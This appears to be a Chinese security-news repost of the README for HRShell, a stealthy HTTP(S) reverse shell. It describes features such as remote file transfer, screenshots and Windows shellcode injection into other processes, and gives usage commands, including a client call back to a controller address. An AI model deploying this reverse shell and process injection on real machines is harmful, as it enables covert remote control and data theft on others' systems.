![](https://image.3001.net/images/20190828/1566949843_5d65c1d316e43.png!small)

**HRShell是一个使用Flask构建的高级HTTP(S)反向Shell，其兼容python 2.x/3.x并已在以下操作系统成功测试：**

> Linux ubuntu 18.04 LTS
>
> macOS Mojave
>
> Windows 7/10

##  特性

> 隐秘性
>
> TLS支持
>
> 1）使用即时证书或
>
> 2）通过指定证书/密钥对
>
> 客户端的代理支持。
>
> 目录导航（cd命令和变体）。
>
> 支持download/upload/screenshot命令。
>
> shellcode注入（仅适用于Windows x86系统）
>
> 1）通过指定其PID，将shellcode注入另一个进程
>
> 2）或注入当前运行的进程中
>
> 支持管道 (|) 和链式命令 (;)
>
> 支持各个非交互式（如gdb，top等...）命令
>
> Server服务器同时支持HTTP和HTTPS。
>
> 迄今为止，它配备了两个内置服务器...内置flask和tornado-> WSGI，同时它还兼容其他生产服务器，如[gunicorn](http://gunicorn.org/)和[Nginx](https://www.nginx.com/)。
>
> server.py和client.py都可轻松扩展。
>
> 由于大多数功能来自服务器的端点设计，因此用任何其他语言（java，GO等......）编写客户端都非常容易

##  详细信息

###  TLS

**服务器端：** 除非指定--http选项，否则默认情况下server.py是使用即时证书的HTTPS，因为即时证书是内置的flask功能。但是，如果指定了-s
tornado选项使用TLS，则必须如下指定--cert和--key选项：

    
    
    python server.py -s tornado --cert /path/cert.pem --key /path/key.pem

可以使用“real”证书或生成证书/密钥对使用[openssl](https://www.openssl.org/)，如下所示：

    
    
    openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365

证书/密钥对也可以与flask-server一起使用：

    
    
    python server.py --cert /path/cert.pem --key /path/key.pem

如果服务器使用TLS，那么根据设计，客户端不能使用[http://...](http://.../)连接到服务器，但必须明确使用https。

**客户端：** 默认情况下，客户端的SSL验证被禁用，除非：

要么指定--cert参数，例如：

    
    
    python client.py -s https://192.168.10.7:5000 --cert /path/cert.pem

或使用有效证书预先设置CERT变量，而不是默认的None值，例如：

    
    
    CERT = """
    -----BEGIN CERTIFICATE-----    MIIBoDCCAUoCAQAwDQYJKoZIhvcNAQEEBQAwYzELMAkGA1UEBhMCQVUxEzARBgNV
    BAgTClF1ZWVuc2xhbmQxGjAYBgNVBAoTEUNyeXB0U29mdCBQdHkgTHRkMSMwIQYD
    VQQDExpTZXJ2ZXIgdGVzdCBjZXJ0ICg1MTIgYml0KTAeFw05NzA5MDkwMzQxMjZa
    ...
    -----END CERTIFICATE-----    """

在这种情况下，client.py将尝试动态创建隐藏的.cert.pem文件，并将使用它。

**可用命令：**

    
    
    upload <file or path-to-file>: 上传文件到客户端
    download <file or path-to-file>: 从客户端下载文件
    screenshot: 从客户端下载截图并删除它
    migrate <PID>: 尝试将shellcode注入到指定PID进程
    inject shellcode: 注入shellcode到当前进程
    clear: 清屏（对于unix和windows系统是一样的）
    exit: 关闭与客户端的连接

如果是非交互式的则支持任意其他命令（如gdb，top等...）你同样可以通过键入python server.py -h或python client.py
-h，获取服务器和客户端可用参数的信息。

**注意：** 如果客户端与服务器连接并且我们想要终止服务器，则在按CTRL+C之前，我们必须使用exit命令关闭连接。

###  Shellcode 注入

目前，shellcode注入只能在x86 windows系统中执行。

![](https://image.3001.net/images/20190829/1567077281_5d67b3a18ce35.png!small)

**注释**

注入工作的基本先决条件是在client.py上，将shellcode变量设置为有效的shellcode。

如果注入发生在其它进程上，则进程权限起着非常重要的作用。由于缺乏适当的权限，并不总是可以注入任意进程。

当注入发生在当前进程（实际上是client.py）时，如果注入成功，HTTP(S)可能会挂起。

**创建自定义命令**

**客户端：**

如果命令要求在服务器端存在新端点，则：

定义端点：

    
    
    @app.route('/custom_endpoint/<arg>')
    def custom_endpoint(arg):
        """
        documentation if needed
        """
        ...
        return ...

然后编辑handleGET()将客户端重定向到该端点：

    
    
    @app.route('/')
    def handleGET():
        ...
        return redirect(url_for('custom_endpoint',
            arg=...)
            )

在handlePOST()中进行适当的编辑以处理呈现的结果。

**脚本参数**

两个脚本（server.py和client.py）都可以通过参数自定义：

**server.py**

    
    
    $ python server.py -h
    usage: server.py [-h] [-s] [-c] [--host] [-p] [--http] [--cert] [--key]
    server.py: An HTTP(S) reverse-shell server with advanced features.
    arguments:
      -h, --help      显示帮助信息并退出
      -s , --server   指定要使用的HTTP(S)服务器（默认值：flask）。
      -c , --client   仅接受来自指定客户端/IP的连接。
      --host          指定要使用的IP（默认值：0.0.0.0）。
      -p , --port     指定要使用的端口（默认值：5000）。
      --http          禁用TLS并改为使用HTTP。
      --cert          指定要使用的证书（默认值：None）。
      --key           指定要使用的相应私钥（默认值：None）。

**client.py**

    
    
    $ python client.py -h
    usage: client.py [-h] [-s] [-c] [-p]
    client.py: An HTTP(S) client with advanced features.
    arguments:
      -h, --help      显示此帮助信息并退出
      -s , --server   指定要连接的HTTP(S)服务器。
      -c , --cert     指定要使用的证书。
      -p , --proxy    指定要使用的代理[form: host:port]

**先决条件**

**注意：** 要安装server-requirements：

    
    
    pip install -r requirements.txt --upgrade --user

##  **未来计划**

> 添加更多命令及功能。
>
> 修复潜在的bug。

##  贡献和反馈

欢迎大家随时向我提出反馈和贡献。如果你发现任何的错误或对功能的补充，请随时打开issue，一旦我看到了就会尝试解决它。

***参考来源：[GitHub](https://github.com/chrispetrou/HRShell)，FB小编secist编译，转载请注明来自FreeBuf.COM**

  

